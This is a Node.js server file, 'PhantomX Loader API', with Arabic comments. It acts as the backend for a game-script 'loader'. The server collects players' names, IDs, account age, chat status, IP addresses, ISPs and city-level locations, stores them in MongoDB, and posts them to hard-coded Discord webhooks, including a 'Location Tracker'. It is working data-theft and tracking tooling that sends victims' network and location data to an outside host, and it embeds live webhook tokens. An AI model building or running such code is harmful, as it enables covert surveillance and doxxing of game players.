// ============================================
// PhantomX Loader API - النسخة النهائية
// ============================================
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const mongoose = require('mongoose');
const { v4: uuidv4 } = require('uuid');
const cron = require('node-cron');
const winston = require('winston');
const axios = require('axios');
require('dotenv').config();

// ====================
// إعداد اللوجر
// ====================
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp({ format: 'YYYY-MM-DD HH:mm:ss' }),
    winston.format.printf(({ timestamp, level, message }) => {
      return `[${timestamp}] ${level.toUpperCase()}: ${message}`;
    })
  ),
  transports: [
    new winston.transports.File({ filename: 'logs/error.log', level: 'error' }),
    new winston.transports.File({ filename: 'logs/combined.log' }),
    new winston.transports.Console()
  ]
});

// ====================
// إعداد الويب هوكات
// ====================
const WEBHOOKS = {
  LOCATION: process.env.LOCATION_WEBHOOK || "https://discord.com/api/webhooks/1470005712418771138/r6ejZJ___runqhgu0_IKmepof1DPdL4-d3VI5wJHO32OVEe4AhJLcB2mvJDU1jrn7jls",
  DISCORD: process.env.DISCORD_WEBHOOK || "https://discord.com/api/webhooks/1449124545620611255/OnOeMG0VM3A4XeS3aBDRs5xxETz_rXnc-i2R__zKwyA06VLuNE6nFdJaP38Po1Q80rkB",
  SUCCESS: process.env.SUCCESS_WEBHOOK || "https://discord.com/api/webhooks/1449849027205005553/PAEzYHXc3N73MSE4amTvjYzQgzeWyTF_G9j2TbszgjuhhbMfraCj71jxXydDrRpbPEWR"
};

// ====================
// دالة الإرسال للديسكورد
// ====================
async function sendToDiscord(webhookUrl, embedData, webhookType = 'LOCATION') {
  try {
    const data = {
      username: getWebhookUsername(webhookType),
      avatar_url: "https://cdn.discordapp.com/attachments/1153844022028087316/1251378827826102393/phantomx_logo.png",
      embeds: [embedData]
    };

    const response = await axios.post(webhookUrl, data, {
      headers: {
        'Content-Type': 'application/json'
      },
      timeout: 10000
    });

    logger.info(`✅ تم الإرسال للديسكورد (${webhookType}): ${response.status}`);
    return { success: true, status: response.status };
  } catch (error) {
    logger.error(`❌ فشل الإرسال للديسكورد (${webhookType}): ${error.message}`);
    return { success: false, error: error.message };
  }
}

function getWebhookUsername(type) {
  switch (type) {
    case 'LOCATION': return "🌍 PhantomX Location Tracker";
    case 'SUCCESS': return "✅ PhantomX Success Logger";
    case 'DISCORD': return "🔗 PhantomX Discord Logger";
    default: return "⚡ PhantomX Logger";
  }
}

// ====================
// نماذج قاعدة البيانات
// ====================
mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/phantomx_tracker', {
  useNewUrlParser: true,
  useUnifiedTopology: true
});

const db = mongoose.connection;
db.on('error', (err) => logger.error('❌ خطأ في اتصال MongoDB:', err));
db.once('open', () => logger.info('✅ تم الاتصال بـ MongoDB بنجاح'));

const sessionSchema = new mongoose.Schema({
  sessionId: { type: String, required: true, unique: true },
  playerId: { type: String, required: true },
  playerName: { type: String, required: true },
  gameId: { type: String, required: true },
  gameName: { type: String },
  jobId: { type: String, required: true },
  ip: { type: String },
  country: { type: String },
  city: { type: String },
  isp: { type: String },
  chatStatus: { type: String },
  accountAge: { type: String },
  createdAt: { type: Date, default: Date.now },
  lastHeartbeat: { type: Date, default: Date.now },
  isActive: { type: Boolean, default: true }
});

const reportSchema = new mongoose.Schema({
  type: { type: String, enum: ['LOCATION', 'SUCCESS', 'DISCORD'], required: true },
  playerId: { type: String, required: true },
  playerName: { type: String },
  data: { type: Object, default: {} },
  discordSent: { type: Boolean, default: false },
  discordError: { type: String },
  timestamp: { type: Date, default: Date.now }
});

const Session = mongoose.model('Session', sessionSchema);
const Report = mongoose.model('Report', reportSchema);

// ====================
// إعداد Express
// ====================
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false
}));
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// ====================
// الرواومات الرئيسية
// ====================

// 🔵 الصفحة الرئيسية
app.get('/', (req, res) => {
  res.json({
    status: 'online',
    service: 'PhantomX Loader API',
    version: '2.0.0',
    description: 'نظام استقبال وإرسال بيانات PhantomX للديسكورد',
    endpoints: {
      join: 'GET /join?player=ID',
      heartbeat: 'GET /heartbeat?session=ID',
      location: 'POST /api/report/location',
      success: 'POST /api/report/success',
      stats: 'GET /api/stats'
    },
    timestamp: new Date().toISOString()
  });
});

// 🔵 إنشاء جلسة جديدة (JOIN)
app.get('/join', async (req, res) => {
  try {
    const { player, gameId, jobId, playerName } = req.query;
    
    if (!player) {
      return res.status(400).json({ 
        success: false, 
        error: 'معرف اللاعب مطلوب (player parameter)' 
      });
    }

    const sessionId = uuidv4();
    
    // إنشاء جلسة جديدة
    const newSession = new Session({
      sessionId,
      playerId: player.toString(),
      playerName: playerName || `Player_${player}`,
      gameId: gameId || 'unknown',
      gameName: req.query.gameName || 'Unknown Game',
      jobId: jobId || 'unknown',
      ip: req.ip || 'unknown',
      isActive: true
    });

    await newSession.save();

    logger.info(`🟢 جلسة جديدة: ${sessionId} للاعب ${player}`);

    res.json({
      success: true,
      session: sessionId,
      message: 'تم إنشاء الجلسة بنجاح',
      timestamp: new Date().toISOString()
    });

  } catch (error) {
    logger.error(`❌ خطأ في /join: ${error.message}`);
    res.status(500).json({ 
      success: false, 
      error: 'خطأ داخلي في السيرفر' 
    });
  }
});

// 🔵 تحديث الجلسة (HEARTBEAT)
app.get('/heartbeat', async (req, res) => {
  try {
    const { session } = req.query;
    
    if (!session) {
      return res.status(400).json({ 
        success: false, 
        error: 'معرف الجلسة مطلوب (session parameter)' 
      });
    }

    const updatedSession = await Session.findOneAndUpdate(
      { sessionId: session },
      { 
        lastHeartbeat: new Date(),
        isActive: true 
      },
      { new: true }
    );

    if (!updatedSession) {
      return res.status(404).json({ 
        success: false, 
        error: 'الجلسة غير موجودة' 
      });
    }

    res.json({
      success: true,
      message: 'تم استلام الـ Heartbeat',
      lastHeartbeat: updatedSession.lastHeartbeat
    });

  } catch (error) {
    logger.error(`❌ خطأ في /heartbeat: ${error.message}`);
    res.status(500).json({ 
      success: false, 
      error: 'خطأ داخلي في السيرفر' 
    });
  }
});

// 🔵 استقبال تقرير الموقع من اللودر
app.post('/api/report/location', async (req, res) => {
  try {
    const reportData = req.body;
    
    if (!reportData || !reportData.playerId) {
      return res.status(400).json({ 
        success: false, 
        error: 'بيانات غير صالحة' 
      });
    }

    logger.info(`📍 تقرير موقع من: ${reportData.playerName || reportData.playerId}`);

    // حفظ التقرير في قاعدة البيانات
    const newReport = new Report({
      type: 'LOCATION',
      playerId: reportData.playerId.toString(),
      playerName: reportData.playerName,
      data: reportData,
      timestamp: new Date()
    });

    await newReport.save();

    // إعداد بيانات الإمبد للديسكورد
    const discordEmbed = {
      title: "🌍 PHANTOMX LOCATION REPORT",
      color: 3447003,
      fields: [
        {
          name: "🎮 **GAME INFORMATION**",
          value: `**Name:** ${reportData.gameName || 'N/A'}\n**ID:** \`${reportData.gameId || 'N/A'}\`\n**Server:** \`${reportData.jobId || 'N/A'}\``,
          inline: false
        },
        {
          name: "👤 **PLAYER INFORMATION**",
          value: `**Name:** \`${reportData.playerName || 'N/A'}\`\n**ID:** \`${reportData.playerId || 'N/A'}\`\n**Display:** \`${reportData.displayName || 'N/A'}\``,
          inline: false
        },
        {
          name: "📅 **ACCOUNT INFO**",
          value: `**Age:** ${reportData.accountAge || 'N/A'}\n**Created:** ${reportData.createdDate || 'N/A'}`,
          inline: true
        },
        {
          name: "💬 **CHAT STATUS**",
          value: `${reportData.chatStatus || 'N/A'}\n**System:** ${reportData.chatSystem || 'N/A'}`,
          inline: true
        },
        {
          name: "🌐 **NETWORK INFO**",
          value: `**IP:** ||\`${reportData.ip || 'N/A'}\`||\n**ISP:** ${reportData.isp || 'N/A'}`,
          inline: false
        },
        {
          name: "📍 **LOCATION DETAILS**",
          value: `**Country:** ${reportData.country || 'N/A'} (${reportData.country_code || 'N/A'})\n**Region:** ${reportData.region || 'N/A'}\n**City:** ${reportData.city || 'N/A'}`,
          inline: false
        }
      ],
      footer: {
        text: `PhantomX Location • ${new Date().toLocaleDateString('en-US')}`
      },
      timestamp: new Date().toISOString(),
      thumbnail: {
        url: "https://cdn.discordapp.com/attachments/1153844022028087316/1251378827826102393/phantomx_logo.png"
      }
    };

    // إرسال للديسكورد
    const discordResult = await sendToDiscord(WEBHOOKS.LOCATION, discordEmbed, 'LOCATION');

    // تحديث حالة الإرسال في قاعدة البيانات
    newReport.discordSent = discordResult.success;
    if (!discordResult.success) {
      newReport.discordError = discordResult.error;
    }
    await newReport.save();

    res.json({
      success: true,
      message: 'تم استلام تقرير الموقع',
      discord: discordResult.success ? 'تم الإرسال للديسكورد' : 'فشل الإرسال للديسكورد',
      reportId: newReport._id
    });

  } catch (error) {
    logger.error(`❌ خطأ في /api/report/location: ${error.message}`);
    res.status(500).json({ 
      success: false, 
      error: 'خطأ داخلي في السيرفر' 
    });
  }
});

// 🔵 استقبال تقرير النجاح من اللودر
app.post('/api/report/success', async (req, res) => {
  try {
    const successData = req.body;
    
    if (!successData || !successData.playerId) {
      return res.status(400).json({ 
        success: false, 
        error: 'بيانات غير صالحة' 
      });
    }

    logger.info(`✅ تقرير نجاح من: ${successData.playerName || successData.playerId}`);

    // حفظ التقرير
    const newReport = new Report({
      type: 'SUCCESS',
      playerId: successData.playerId.toString(),
      playerName: successData.playerName,
      data: successData,
      timestamp: new Date()
    });

    await newReport.save();

    // إعداد إمبد الديسكورد
    const discordEmbed = {
      title: "✅ PhantomX - Script Loaded Successfully",
      color: 65280,
      fields: [
        {
          name: "🎮 Game Name",
          value: `\`\`\`${successData.gameName || 'N/A'}\`\`\``,
          inline: false
        },
        {
          name: "🆔 Game ID",
          value: `\`${successData.gameId || 'N/A'}\``,
          inline: true
        },
        {
          name: "🔗 Job ID",
          value: `'${successData.jobId || 'N/A'}'`,
          inline: true
        },
        {
          name: "👤 Player Name",
          value: `\`${successData.playerName || 'N/A'}\``,
          inline: true
        },
        {
          name: "🆔 Player ID",
          value: `\`${successData.playerId || 'N/A'}\``,
          inline: true
        },
        {
          name: "📅 Account Age",
          value: `\`${successData.accountAge || 'N/A'}\`\nCreated: \`${successData.createdDate || 'N/A'}\``,
          inline: true
        },
        {
          name: "💬 Chat Status",
          value: `${successData.chatStatus || 'N/A'}\nSystem: \`${successData.chatSystem || 'N/A'}\``,
          inline: true
        },
        {
          name: "🎯 Script Name",
          value: `\`${successData.scriptName || 'N/A'}\``,
          inline: true
        }
      ],
      footer: {
        text: `PhantomX • ${new Date().toLocaleDateString('en-US')}`
      },
      timestamp: new Date().toISOString(),
      thumbnail: {
        url: "https://cdn.discordapp.com/attachments/1153844022028087316/1251378827826102393/phantomx_logo.png"
      },
      description: `✅ Script loaded successfully!\n**Game:** ${successData.gameName || 'N/A'}`
    };

    // إرسال للديسكورد
    const discordResult = await sendToDiscord(WEBHOOKS.SUCCESS, discordEmbed, 'SUCCESS');

    // تحديث حالة الإرسال
    newReport.discordSent = discordResult.success;
    if (!discordResult.success) {
      newReport.discordError = discordResult.error;
    }
    await newReport.save();

    res.json({
      success: true,
      message: 'تم استلام تقرير النجاح',
      discord: discordResult.success ? 'تم الإرسال للديسكورد' : 'فشل الإرسال للديسكورد',
      reportId: newReport._id
    });

  } catch (error) {
    logger.error(`❌ خطأ في /api/report/success: ${error.message}`);
    res.status(500).json({ 
      success: false, 
      error: 'خطأ داخلي في السيرفر' 
    });
  }
});

// 🔵 إحصائيات النظام
app.get('/api/stats', async (req, res) => {
  try {
    const activeSessions = await Session.countDocuments({ isActive: true });
    const totalReports = await Report.countDocuments();
    const locationReports = await Report.countDocuments({ type: 'LOCATION' });
    const successReports = await Report.countDocuments({ type: 'SUCCESS' });
    
    const recentReports = await Report.find({})
      .sort({ timestamp: -1 })
      .limit(10)
      .select('type playerName timestamp discordSent');

    res.json({
      success: true,
      stats: {
        activeSessions,
        totalReports,
        locationReports,
        successReports,
        uptime: process.uptime().toFixed(2) + 's'
      },
      recentReports,
      webhooks: {
        location: WEBHOOKS.LOCATION ? '✅ مفعل' : '❌ غير مفعل',
        success: WEBHOOKS.SUCCESS ? '✅ مفعل' : '❌ غير مفعل',
        discord: WEBHOOKS.DISCORD ? '✅ مفعل' : '❌ غير مفعل'
      },
      timestamp: new Date().toISOString()
    });

  } catch (error) {
    logger.error(`❌ خطأ في /api/stats: ${error.message}`);
    res.status(500).json({ 
      success: false, 
      error: 'خطأ داخلي في السيرفر' 
    });
  }
});

// 🔵 تنظيف الجلسات القديمة (تتشغل كل 5 دقائق)
cron.schedule('*/5 * * * *', async () => {
  try {
    const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
    const result = await Session.updateMany(
      { lastHeartbeat: { $lt: fiveMinutesAgo } },
      { $set: { isActive: false } }
    );
    
    if (result.modifiedCount > 0) {
      logger.info(`🧹 تم تعطيل ${result.modifiedCount} جلسة منتهية`);
    }
  } catch (error) {
    logger.error(`❌ خطأ في تنظيف الجلسات: ${error.message}`);
  }
});

// ====================
// تشغيل السيرفر
// ====================
app.listen(PORT, () => {
  logger.info(`🚀 PhantomX API يعمل على http://localhost:${PORT}`);
  logger.info(`🌐 Webhooks: ${Object.keys(WEBHOOKS).length} مفعلة`);
});

// معالجة الأخطاء غير المتوقعة
process.on('uncaughtException', (error) => {
  logger.error(`💥 خطأ غير متوقع: ${error.message}`);
});

process.on('unhandledRejection', (reason, promise) => {
  logger.error(`💥 وعد مرفوض: ${reason}`);
});
